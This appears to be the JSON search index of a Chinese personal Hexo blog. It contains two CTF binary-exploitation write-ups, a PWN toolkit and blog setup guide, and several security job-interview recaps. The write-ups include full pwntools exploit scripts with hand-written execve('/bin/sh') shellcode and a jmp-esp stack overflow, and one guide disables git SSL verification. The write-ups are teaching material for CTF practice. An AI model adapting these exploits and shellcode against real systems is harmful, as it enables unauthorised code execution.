{"meta":{"title":"Hexo","subtitle":"","description":"","author":"vvmdx","url":"https://vvmdx.github.io","root":"/"},"pages":[{"title":"","date":"2021-07-13T08:51:14.047Z","updated":"2021-07-13T08:47:53.457Z","comments":true,"path":"baidu_verify_code-ElhKiUUMYo.html","permalink":"https://vvmdx.github.io/baidu_verify_code-ElhKiUUMYo.html","excerpt":"","text":"a634d750ec3ecf877288a10730990c54"},{"title":"标签","date":"2021-07-14T05:06:40.222Z","updated":"2021-07-13T08:22:51.147Z","comments":false,"path":"tags/index.html","permalink":"https://vvmdx.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-07-14T05:06:11.220Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"categories/index.html","permalink":"https://vvmdx.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-07-14T03:14:08.651Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"repository/index.html","permalink":"https://vvmdx.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"CISCN_2019_s_9","slug":"2021-06-18-CISCN_2019_s_9","date":"2021-06-17T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/18/2021-06-18-CISCN_2019_s_9/","link":"","permalink":"https://vvmdx.github.io/2021/06/18/2021-06-18-CISCN_2019_s_9/","excerpt":"","text":"CISCN_2019_s_9 程序逻辑 查看保护 32位，无任何保护 伪代码 pwn函数 fgets读取输入后直接输出 没有调用shellcode hint函数 jmp esp：跳转到esp执行 esp存放指向栈顶的指针 跳转后会去执行栈中的指令 调试 main处打断点，run后发现直接调用pwn函数，单步进入 gdb ciscn_s_9 b main r s 此时函数栈帧状态如下 进入pwn函数，首先是当前栈底ebp压栈，更新ebp为当前栈顶esp，然后开辟一块0x28的栈空间 push ebp mov ebp, esp sub esp, 0x28 打印字符串，跳过即可 获取数据流输入，写入栈 lea eax, [ebp+s] ; 把ebp+s的地址给eax push eax ; eax入栈 由于s被定义为-0x20，因此eax从ebp-0x20处(0x148)开始 构造一个’a’*0x20 + ‘b’*4的输入，发现’a’*0x20填满0x148~0x164，bbbb刚好覆盖ebp地址0x168 返回主函数 leave ; mov esp, ebp; pop ebp ret ; pop eip leave执行后栈帧如下 执行ret后，eip=0x804856f，回到返回地址，函数执行结束 hint函数 可以看到hint有一条跳转到esp的指令，由于栈上代码可执行，可以利用这个跳转到shellcode的位置 思路 在输入的时候可以把hint中的跳转指令的地址覆盖到0x16c即返回地址上，使得pwn函数在运行到ret时不会返回主函数，而是跳转到hint函数 ret到hint后会跳转到esp去执行我们的输入 由于pwn函数写入栈的位置为**[ebp+s]也即0x168-0x20=0x148的位置，而我们当前的esp位置为0x170**，因此需要把esp减去0x28使其能够刚好读到我们的输入 PWN 编写脚本 123456789101112131415161718192021222324252627from pwn import *context(os=&#x27;linux&#x27;)p = process(&#x27;./ciscn_s_9&#x27;)# p = remote(&#x27;node3.buuoj.cn&#x27;,26442) shellcode =&#x27;&#x27;&#x27;xor eax,eaxxor ecx,ecxxor edx,edxpush 0x0068732fpush 0x6e69622fmov ebx,espmov al,0xbint 0x80&#x27;&#x27;&#x27;shellcode = asm(shellcode)shell = &quot;sub esp, 0x28; call esp&quot;shell = asm(shell)p.recvuntil(&quot;&gt;\\n&quot;)payload = shellcode.ljust(0x24,b&quot;\\x90&quot;)payload += p32(0x8048554) #jmp esppayload += shellgdb.attach(p)p.sendline(payload)p.interactive() 可供shellcode的长度只有0x20 = 32个字节，因此不能用shellcraft.sh()，此处使用自己编写的shellcode \\x90为**NOP（空操作）**指令，为了对齐到双字边界（4的偶数倍） shellcode.ljust(0x24, b&quot;\\x90)即为使用\\x90（NOP指令）填充到0x168的位置，后面再接上0x8048554即jmp esp指令地址 执行效果 在0x0804854F打断点，发送payload后 可以看到此时return的地址已经被覆盖为hint中jmp esp的地址了，单步进入看到已经开始执行我们的shellcode 可以看到成功开启shell 完整代码执行效果如下","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"mrctf2020_shellcode","slug":"2021-06-14-mrctf2020_shellcode","date":"2021-06-13T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/14/2021-06-14-mrctf2020_shellcode/","link":"","permalink":"https://vvmdx.github.io/2021/06/14/2021-06-14-mrctf2020_shellcode/","excerpt":"","text":"mrctf2020_shellcode 程序逻辑 打印“Show me your magic！” 从buf中读取0x400字节的内容 eax存放读取的字节数，与0比较，大于0则跳转到loc_11D6，否则退出程序 12CMP leftOp, rightOpJG function ;大于跳转(left&gt;right) loc_11D6: 将写入的内容地址给rax，然后调用执行 PWN 查看保护 编写脚本 使用pwntools生成shellcode 12345678910from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = shellcraft.sh()payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 使用自己编写的shellcode 1234567891011121314151617181920from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = &#x27;&#x27;&#x27; mov rbx, 0x68732f6e69622f push rbx push rsp pop rdi xor esi, esi xor edx, edx push 0x3b pop rax syscall&#x27;&#x27;&#x27;payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 调试 断点打在call rax那 vmmap查看程序基址(0x55654d65e000) 加上偏移(0x11dd)就是call rax地址 打好断点后发送payload，可以发现已经断在call rax处 回到调试界面，s单步进入函数查看发现shellcode已经被写入函数 一直往下走，直到发现此时已经启动一个新程序**/bin/dash**，说明已经拿到shell 结果 使用pwntools生成的shellcode 使用自己编写的shellcode 单步进入函数后发现也成功写入 同样的也能启动**/bin/dash** 最终结果","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"PWN环境搭建及工具安装","slug":"2021-06-11-PWN环境搭建及工具安装","date":"2021-06-10T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/11/2021-06-11-PWN环境搭建及工具安装/","link":"","permalink":"https://vvmdx.github.io/2021/06/11/2021-06-11-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/","excerpt":"","text":"PWN 环境搭建 环境：Kali 2021 12sudo passwd # 添加root账号su root # 输入刚刚设置的密码，进入root python 3.9（Kali 2021自带） 配置更新源 12345678910mousepad /etc/apt/sources.list# 若mousepad报错，则apt install dbus-x11# mousepad就是记事本#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 升级软件列表/更新软件 123apt-get updateapt-get upgradeapt-get dist-upgrade git配置 1apt install git 工具安装 Pwntools 1234567# python3环境## 更新下载源apt-get upgrade## 安装pip下载工具apt install python3-pip## pip下载pwntoolspip3 install pwntools 下载完会得到两个小工具：checksec（查看保护机制）、ROPgadget one_gadget 功能：查找已知的libc中**exevce(&quot;/bin/sh&quot;)**语句的地址 安装 123456# 安装ruby环境apt install ruby# 安装ruby包管理工具apt install gem# 安装one_gadgetgem install one_gadget LibcSearcher https://github.com/IZAY01/LibcSearcher Libc database search https://libc.blukat.me/ main_arena_offset 堆、偏移 使用IDA Pro也可以做，但是手工做麻烦 https://github.com/bash-c/main_arena_offset GDB 动态分析 GNU项目调试器，用于在Linux系统中动态调试程序 1apt install gdb 增强工具：pwndbg、PEDA、gef 1234# 安装pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 安装完成后再使用gdb就会自动加载pwndbg","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"个人博客搭建","slug":"个人博客搭建","date":"2021-06-05T16:00:00.000Z","updated":"2021-07-14T06:57:35.122Z","comments":true,"path":"2021/06/06/个人博客搭建/","link":"","permalink":"https://vvmdx.github.io/2021/06/06/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"","text":"个人博客搭建 框架：Hexo+github pages 主题：pure 现在你拥有：一个username.github.io的仓库 搭建步骤 Hexo Hexo中文文档（很详细，建议查看） 环境：git + node.js（安装不赘述） node建议使用较新的版本，我在使用旧版本安装后编译时总是报错，换了新版本后就没问题了，windows下直接官网下载新版本覆盖旧版本就行 Hexo安装 使用npm安装 1234npm install -g hexo-cli# 若npm install卡住不动可以换成淘宝镜像npm config get registry # 查看当前下载源npm config set registry https://registry.npm.taobao.org # 更换为淘宝源 初始化 1hexo init blog 效果如下，在目录下会出现blog文件夹 检测搭建效果 123hexo new test # 创建一个test.md的文章hexo g # g=generate 生成静态文件hexo s # s=server 启动服务器 命令执行效果 启动后可访问http://localhost:4000查看 推送/部署网站 打开根目录_config.yml，翻到最下面修改deploy信息 repo：github仓库完整地址，最后要加上.git branch：分支，默认是master或者main，这里的wmdx是我自己改的分支 1234deploy: type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx 安装git部署插件 1npm install hexo-deployer-git --save 推送/部署主页 123hexo clean # 清除缓存和已生成的静态文件hexo ghexo d # d=deploy 推送/部署 执行完成后访问个人网站就能看到主页已经上线了 一些插件 文章字数统计及阅读时长预计 1npm install hexo-wordcount --save 站内搜索 1npm install hexo-generator-json-content --save 自动压缩html、css、js代码 1npm install hexo-neat --save 站点地图 1npm install hexo-generator-sitemap --save 推送Hexo博客新连接至百度搜索引擎 https://github.com/huiwang/hexo-baidu-url-submit 1npm install hexo-baidu-url-submit --save 配置：一个很坑的地方，type如果有两个然后不加横杠，会报错，加了横杠但是放在连续的两行也会报错，一定要像下面这样配置 12345deploy:- type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx- type: baidu_url_submitter pure 更换主题 官方主题 本站主题：pure（文档） 下载主题到blog/themes/pure 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 打开根目录_config.yml更改主题 1theme: landscape -&gt; theme: pure 更新 12hexo cleanhexo d 这时你的主题就已经更新完毕了，效果如下 资源位置 博客文章 \\source\\_posts 头部格式 图片 themes\\pure\\source\\images markdown引用格式（在自己文件里肯定定位不到资源，这个没有关系，主要是为了编译成html时可以定位到资源位置） 1![image2](/images/个人博客搭建/image7.png) pure主题个性化设置 个人博客怎么设置看个人需求，这里建议看文档 以下为我自己的设置 设置语言 12# 根目录_config.ymllanguage: zh-CN 主题颜色 123# themes/pure/_config.ymlconfig: skin: theme-black 导航菜单 用不上的可以注释掉 个人信息设置 1234theme/pure/source/images设置各种图片# themes/pure/_config.yml# profile更改个人信息 文章浏览量设置 1234# PVpv: busuanzi: enable: true # 不蒜子统计 字数统计、阅读时长预计 12345# wordcountpostCount: enable: true wordcount: true # 文章字数统计 min2read: true # 阅读时长预计 部署 1234567# 每次本地更新完内容，按以下步骤推送至githubhexo clean # 清除缓存以及静态文件hexo g # g=generate 生成静态文件hexo d # d=deploy 部署# 如果报错说ssl验证失败则先git config --global http.sslVerify &quot;false&quot;hexo d 疑难杂症 点击首页左侧边栏跳到404 记得把D:\\hexo\\themes\\pure\\_source下的categories、tags和其他主页侧边栏有出现的东西复制到D:\\hexo\\\\source下，不然他不会编译成index.html，打开就会404 开启不蒜子后文章出现两个眼睛（两个统计阅读量的地方） 看网页源码可发现busuanzi和leancloud的文章统计都被开启，即使我们配置文件里面将leancloud设为false，他也会编译出来，只要将D:\\hexo\\themes\\pure\\layout_partial\\post下的pv.ejs中leancloud部分全部删掉就可以了，只留下busuanzi的（如果启用leancloud的话就留下leancloud） 123456789## pv.ejs&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span class=&quot;article-read hidden-xs&quot;&gt; &lt;i class=&quot;icon icon-eye-fill&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt; &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt; &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/span&gt; &lt;/span&gt; &lt;/span&gt;&lt;% &#125; %&gt; 修改首页左边栏底部消息 修改D:\\hexo\\themes\\pure\\layout\\common下的footer.ejs","categories":[{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"小鹏汽车","slug":"小鹏汽车","date":"2021-05-30T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/31/小鹏汽车/","link":"","permalink":"https://vvmdx.github.io/2021/05/31/%E5%B0%8F%E9%B9%8F%E6%B1%BD%E8%BD%A6/","excerpt":"","text":"小鹏汽车面试复盘 一面 时间：2021/05/31 17:00 时长：37分钟 自我介绍 有没有挖过src？ 平时web渗透怎么学的，有实战吗？有过成功发现漏洞的经历吗？ 做web渗透时接触过哪些工具 xxe漏洞是什么？ssrf是什么？ 打ctf的时候负责什么方向的题 为什么要搞信息安全，对安全这一块有多大的兴趣，以后会不会转行，还是打算一直从事安全方面工作 自己平时怎么学安全的，如果让你做一个新的方向（app安全），会投入多少时间去学习，还是说有自己想做的方向 聊一聊代码审计的流程 平时是怎么做代码审计的 有没有审计过开源框架、CMS？ 怎么判断一个数据库是mysql还是oracle的？ sql注入的种类，利用方式？ 聊一聊sql注入的原理及防御思路 做开发的时候用的是什么语言 做java开发的时候用过什么框架，能不能做java安全开发 有没有做过安卓开发 有没有用python写过工具？ msf利用的是哪个漏洞，有没有成功反弹？ 护网的时候主要做了些什么，聊一聊对安全产品的理解 公司现在需要做app安全的人，现在要你做的话，你会去学吗，或者说感兴趣吗，还是说有别的想做的，不想做app安全，能投入多少时间去学 内网渗透了解吗？聊一聊内网渗透的思路 总结：甲方面试，技术问题问的不是很多，很重视经历，包括src、实战渗透等，代码审计也提了建议说要去下载完整的源码做完整的审计，问了能不能做安全开发，因为可能需要开发一些sdk去给人做一个安全防护或者安全过滤，说了他们目前比较需要做app安全的人，问了对这一块感不感兴趣，会不会花时间去学","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"腾讯","slug":"腾讯","date":"2021-05-27T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/28/腾讯/","link":"","permalink":"https://vvmdx.github.io/2021/05/28/%E8%85%BE%E8%AE%AF/","excerpt":"","text":"腾讯面试复盘 一面 时间：2021/05/28 时长：15分钟 自我介绍 sql注入了解吗，讲一讲二次注入的原理 二次注入要怎么修复 sql注入过waf了解吗，若一个sql注入过滤了information关键词，怎么绕过 答了之前遇到一个ctf的题，禁用了information表的读取，最后通过截取字符串比对的方法爆出表名，但是没聊到正经的解决方法 还答了mysql版本 &lt; 5.0时没有information表 Redis未授权访问 渗透测试的一个完整流程 打ctf的时候有没有遇到什么印象特别深的题目 文件下载漏洞有没有什么比较好的利用方式 利用文件下载漏洞找文件名具体是找什么文件名（读取文件一般会读取哪些文件）（ctf中？实战中？） 命令执行漏洞，http不出网有什么比较好的处理方法（发散一点说） 接上一题，通过隧道通信，详细讲讲通过什么类型的隧道，讲讲具体操作 漏洞预警 有没有复现过中间件类型的漏洞（有没有完整的复现过漏洞） 在学校的攻防演练中扮演的角色的主要职责是什么","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"天融信","slug":"天融信","date":"2021-05-24T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/25/天融信/","link":"","permalink":"https://vvmdx.github.io/2021/05/25/%E5%A4%A9%E8%9E%8D%E4%BF%A1/","excerpt":"","text":"天融信面试复盘 时间：2021/05/25 时长：15~20分钟 有没有做过现实环境的渗透测试？有没有提交过src？ 对免杀技术了解多少，制作的木马能不能过360 ctf的成绩？擅长什么方向的题？ 攻防演练有什么成果？ shiro漏洞了解吗，讲一下原理 在linux下，现在有一个拥有大量ip地址的txt文本文档，但是里面有很多重复的，如何快速去重？ 在内网渗透中，通过钓鱼邮件获取到主机权限，但是发现内网拦截了tcp的出网流量，聊一下这个时候应该怎么进行通信？ 代码能力怎样，平时有没有做过代码审计？ 目前对什么方向感兴趣？ 总结：面试官介绍了很多天融信正在做的内容，包括打ctf、做木马免杀（杀软对抗）、安全服务（给甲方做渗透测试，甲方一般是电网这些国企），公司内研究二进制的人很少（包括打ctf的也没有pwn手）","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"长亭科技","slug":"长亭科技","date":"2021-05-23T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/24/长亭科技/","link":"","permalink":"https://vvmdx.github.io/2021/05/24/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80/","excerpt":"","text":"长亭科技面试复盘 一面 时间：2021/05/24 时长：30分钟 自我介绍 web渗透测试有没有过实战 没有，只有自己搭靶机测试过（其实后来想想应该提一下有参加过攻防演练的） 讲一下sql注入原理 原本程序要执行的代码拼接了用户输入的数据 有没有从代码层面了解过sql注入的成因（反问代码层面指的是不是sql语句，答是） 突然不知道怎么答，回答了一些注入时常用的方法和sql注入的种类（布尔盲注、报错注入、延时注入、联合查询、堆叠查询） 了不了解xss，有没有从代码层面了解xss的原理 答了反射型、存储型、DOM型xss，大概了解反射型和存储型怎么利用，代码看的不多 原理答了xss是一种代码注入漏洞，攻击者在网页中注入恶意代码后会导致用户浏览器在加载网页时执行恶意代码 对owasp top10漏洞哪个比较了解 注入 讲一讲怎么防御sql注入 过滤危险字符、转义 sql注入怎么绕过过滤 答了常见的绕过方法，宽字节、url编码、字节覆盖 问了hvv时**有没有成为靶标，有没有对攻击队行为做过研判 在**hvv时的工作内容，有没有做过流量包、数据包的研判 学校攻防演练时担任的角色，主要工作内容，渗透测试的思路，有什么成果（这个问的还是挺细的，具体到分配的任务、有没有拿下主机或者域控、攻防演练的形式和持续时间等都聊了） 平时ctf打的多不多，有什么成绩 平时会不会关注一些新颖的漏洞，会不会做代码审计，比如shiro漏洞等有没有做过漏洞复现 答了本科时是做开发的，代码基础较好，刚开始学，但是完整的审计还没做过 对钓鱼邮件这些有没有什么了解（因为上面聊京东护网时说了钓鱼邮件和微信钓鱼的事） 答了会用msf制作木马，做成office的宏木马，发word或者excel作为钓鱼邮件 目前学习的方向是什么 答了木马免杀技术、代码审计 最后聊了一下他们的人才需求，主要还是偏向代码审计，我就疯狂补充我本科是做开发的，代码基础还不错，对这个方向也感兴趣，然后马上就问了我开发过什么程序，有没有接触过安卓 答了做过web系统开发，安卓没做过，不过很多种编程语言都接触过，目前对代码审计还在学习阶段，因为打ctf的原因只了解一些php常见的高危函数，想去学习更深的东西 问我还有什么问题 二面 时间：2021/05/30 16:00 时长：34min 自我介绍 学代码审计偏哪个语言？擅长哪个语言 拿到一份php代码做审计，审计的流程大概是怎样的 对php开发框架熟吗？比如ThinkPHP这些 给的源码是ThinkPHP框架的话，审计起来和没有使用框架的有什么不同，从流程上或者从关注的点上有什么不同 php原生的敏感函数有哪些，比如搜关键字的话会搜哪些 反序列化漏洞了解吗 反序列的时候，unserialize()反序列一个字符串的时候，对象会有一些魔术方法会被自动调用到，在找反序列化的链时，有哪些魔术方法是可以作为一个入手点去找的 有没有审计过实际的项目，比如github上一些开源cms java审计可以聊一下吗 之前做渗透时有没有做过完整的项目，除了ctf 能不能说一些找到的漏洞，怎么找到的 ssrf这类的漏洞熟悉吗，说一下原理和利用方式 我们利用ssrf可以做什么，达到什么效果 在php环境下，怎么最大程度的利用ssrf，拿到shell或者进内网 怎么利用内网的机器请求内网中的服务 ssrf漏洞的修复建议，修复的时候需要注意哪些细节 如果用白名单策略修复ssrf，从用户输入的变量里拿出要访问的目标，这个要注意哪些，因为一些url会通过特殊的字符做白名单绕过，对取变量这个操作有哪些要注意的细节？ php中三个等号和两个等号有什么区别 php代码常见入口函数怎么找 有一些php的开发框架可以帮我们做一些url路由，对这些路由的方法熟悉吗 介绍下PHP的变量覆盖 有一个php的程序，本身就允许文件包含的操作，同时想要避免文件包含漏洞，写代码的时候要注意哪些 远程文件包含和本地文件包含，这两种涉及的php设置有什么 本地文件包含能不能通过php配置限制文件包含的路径（不通过代码直接通过配置项来解决） php、java代码审计对哪个漏洞特别熟悉 php在做sql注入防御时有哪些方法 java做sql注入的防御 sql的二次注入了解吗，能介绍一下吗 写代码的时候怎么防止二次注入 总结：全是问代码审计的，了解到是一面面试官说要问的，，后面问问题环节聊了下，主要工作内容也是做一些java代码审计的内容，这一块比较缺人 hr面 时间：2021/06/01 15:00 时长：13分钟 前两轮面试感觉怎样 面试官推荐你做java代码审计，可以接受吗 有没有做过完整的渗透测试 我看你本科是学计算机的，做开发的，读研为什么会想要做安全呢 有没有面试过别的公司，结果怎样 对乙方安全公司和甲方有什么看法，更想去哪工作 聊待遇、补贴等等","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]}],"categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"},{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"},{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"},{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"},{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]}